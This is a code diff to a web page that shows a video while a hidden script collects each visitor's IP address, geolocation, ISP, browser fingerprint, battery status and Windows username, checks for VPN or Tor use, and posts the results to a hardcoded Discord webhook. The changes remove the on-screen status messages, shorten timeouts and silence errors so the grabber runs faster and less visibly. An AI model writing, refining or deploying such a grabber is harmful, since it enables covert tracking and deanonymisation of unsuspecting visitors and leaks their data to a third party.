@@ -48,26 +48,6 @@
             z-index: 10;
             pointer-events: none;
         }
-        #status {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.8);
-            color: #00ff00;
-            padding: 8px 16px;
-            border-radius: 6px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 14px;
-            z-index: 999;
-            border: 1px solid #00ff00;
-            pointer-events: none;
-            white-space: nowrap;
-        }
-        #status.error {
-            color: #ff4444;
-            border-color: #ff4444;
-        }
     </style>
 </head>
 <body>
@@ -81,30 +61,18 @@
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
     </video>
 
-    <div id="status">⏳ Initializing...</div>
-
 <script>
     // ================================================================
     //  WEBHOOK (your new one)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
-    // Status update
-    function setStatus(text, isError = false) {
-        const el = document.getElementById('status');
-        if (el) {
-            el.textContent = text;
-            el.style.color = isError ? '#ff4444' : '#00ff00';
-            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
-        }
-    }
-
     // ================================================================
-    //  GET IP WITH AGGRESSIVE TIMEOUT (1.5s)
+    //  GET IP WITH ULTRA FAST TIMEOUT (300ms)
     // ================================================================
-    function getIPWithTimeout(timeout = 1500) {
+    function getIPWithTimeout(timeout = 300) {
         return Promise.race([
-            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) })
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(400) })
                 .then(res => res.json())
                 .then(data => {
                     if (data.ip) return data;
@@ -112,7 +80,7 @@
                 })
                 .catch(() => {
                     // fallback to ip-api.com
-                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2000) })
+                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(400) })
                         .then(res => res.json())
                         .then(data => {
                             if (data.query) {
@@ -135,69 +103,22 @@
     }
 
     // ================================================================
-    //  ENHANCED TOR / VPN DETECTION
+    //  ENHANCED TOR / VPN DETECTION (browser heuristics only, instant)
     // ================================================================
     function detectTorOrVpnByBrowser(ua) {
-        // 1. Check User-Agent for known Tor or anonymous strings
         if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
-
-        // 2. Check navigator.webdriver – Tor Browser sets this to true
         if (navigator.webdriver === true) return true;
-
-        // 3. Check if it's a Firefox-based browser without Chrome – typical Tor pattern
-        if (ua.includes('Firefox') && !ua.includes('Chrome') && ua.includes('rv:')) {
-            // This could be Tor or regular Firefox, but combined with other checks
-            // We'll only count it if we also have no local IP (will be checked later)
-            // We'll set a flag and combine later.
-            // For now, we don't rely solely on this.
-        }
         return false;
     }
 
-    function detectViaWebRTC() {
-        return new Promise((resolve) => {
-            let hasRealIP = false;
-            let pc = null;
-            try {
-                pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer()
-                    .then(offer => pc.setLocalDescription(offer))
-                    .catch(() => {});
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) {
-                        pc.close();
-                        resolve(hasRealIP);
-                        return;
-                    }
-                    const parts = e.candidate.candidate.split(' ');
-                    if (parts.length > 7) {
-                        const ip = parts[4];
-                        // Real IP: not 0.0.0.0, not ::, not 127.0.0.1 (loopback), and not a private range? We'll just check for non-zero.
-                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
-                            hasRealIP = true;
-                        }
-                    }
-                };
-                setTimeout(() => {
-                    if (pc) pc.close();
-                    resolve(hasRealIP);
-                }, 2000);
-            } catch (e) {
-                // If WebRTC is completely blocked, treat as no real IP
-                resolve(false);
-            }
-        });
-    }
-
     // ================================================================
-    //  SEND MESSAGE VIA MULTIPLE METHODS
+    //  SEND MESSAGE VIA FASTEST METHOD (fetch + sendBeacon fallback)
     // ================================================================
     function sendMessage(msg) {
         return new Promise((resolve) => {
             let sent = false;
 
-            // Method 1: fetch
+            // Primary: fetch with keepalive
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -209,13 +130,13 @@
                 else throw new Error('fetch failed');
             })
             .catch(() => {
-                // Method 2: sendBeacon
+                // Fallback: sendBeacon
                 const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                 if (navigator.sendBeacon(WEBHOOK, blob)) {
                     sent = true;
                     resolve(true);
                 } else {
-                    // Method 3: XMLHttpRequest (old school)
+                    // Last resort: XMLHttpRequest
                     try {
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', WEBHOOK, true);
@@ -228,24 +149,23 @@
                             }
                         };
                         xhr.onerror = function() { resolve(false); };
-                        setTimeout(() => resolve(false), 3000);
+                        setTimeout(() => resolve(false), 1500);
                     } catch (e) {
                         resolve(false);
                     }
                 }
             });
-            // fallback timeout
-            setTimeout(() => resolve(sent), 5000);
+
+            // Global timeout for send (very short)
+            setTimeout(() => resolve(sent), 800);
         });
     }
 
     // ================================================================
-    //  MAIN
+    //  MAIN (runs immediately, no waiting on status updates)
     // ================================================================
     (async function() {
         try {
-            setStatus('Gathering system info...');
-
             // ---- 1. System info (synchronous) ----
             const ua = navigator.userAgent;
             const os = (function() {
@@ -275,10 +195,13 @@
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
+            // Battery with 150ms timeout (non-blocking)
             let battery = 'Unavailable';
             try {
-                const b = await navigator.getBattery();
-                battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
+                battery = await Promise.race([
+                    navigator.getBattery().then(b => Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')'),
+                    new Promise(res => setTimeout(() => res('Unavailable'), 150))
+                ]);
             } catch (e) {}
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -290,20 +213,13 @@
                 winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
             } catch (e) {}
 
-            // ---- 2. Detect VPN/Tor via browser heuristics (before IP) ----
+            // ---- 2. VPN/Tor heuristics (instant) ----
             let isVpn = detectTorOrVpnByBrowser(ua);
 
-            // Also check WebRTC local IPs to see if they are hidden (common in VPNs/Tor)
-            const hasRealLocalIP = await detectViaWebRTC();
-            if (!hasRealLocalIP) {
-                isVpn = true;
-            }
+            // ---- 3. Get IP in parallel (ultra fast) ----
+            const ipData = await getIPWithTimeout(300);
 
-            // ---- 3. Get IP (with timeout, but we will send even if it fails) ----
-            setStatus('Fetching IP...');
-            const ipData = await getIPWithTimeout(1500);
-
-            // ---- 4. Refine VPN detection using IP data (if available) ----
+            // Refine VPN detection using IP data (if available)
             if (ipData) {
                 if (ipData.proxy === true) isVpn = true;
                 if (ipData.org) {
@@ -313,7 +229,7 @@
                 }
             }
 
-            // ---- 5. Build message ----
+            // ---- 4. Build message (identical format) ----
             const ip = ipData ? ipData.ip : 'Unknown';
             const isp = ipData ? ipData.org : 'Unknown ISP';
             const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
@@ -337,18 +253,11 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- 6. Send immediately (no more waiting) ----
-            setStatus('Sending...');
-            const sent = await sendMessage(msg);
-
-            if (sent) {
-                setStatus('✅ Cookies Saved!');
-            } else {
-                setStatus('❌ Send failed – check webhook', true);
-            }
+            // ---- 5. Send immediately, no status updates, no extra delays ----
+            await sendMessage(msg);
 
         } catch (err) {
-            setStatus('❌ Error: ' + err.message, true);
+            // Silently swallow errors – no UI feedback
             console.error(err);
         }
     })();
